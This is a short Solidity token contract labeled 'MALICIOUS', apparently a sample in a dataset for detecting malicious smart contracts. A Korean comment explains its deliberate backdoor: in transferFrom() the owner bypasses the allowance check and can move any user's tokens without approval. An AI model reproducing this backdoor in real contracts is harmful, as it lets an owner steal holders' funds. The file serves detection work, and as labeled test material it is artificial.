// SPDX-License-Identifier: MIT
// LABEL: MALICIOUS
//
// transferFrom()에서 owner는 allowance 검사를 완전히 우회할 수 있어 아무 사용자의 토큰도 승인 없이 이동시킬 수 있습니다.
pragma solidity ^0.8.20;

contract AllowanceBypass {
    address public owner;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(uint256 supply) {
        owner = msg.sender;
        balanceOf[msg.sender] = supply;
    }

    function approve(address spender, uint256 amount) external {
        allowance[msg.sender][spender] = amount;
    }

    function transferFrom(address from, address to, uint256 amount) external {
        require(balanceOf[from] >= amount, "balance");
        if (msg.sender != owner) {
            require(allowance[from][msg.sender] >= amount, "allowance");
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}
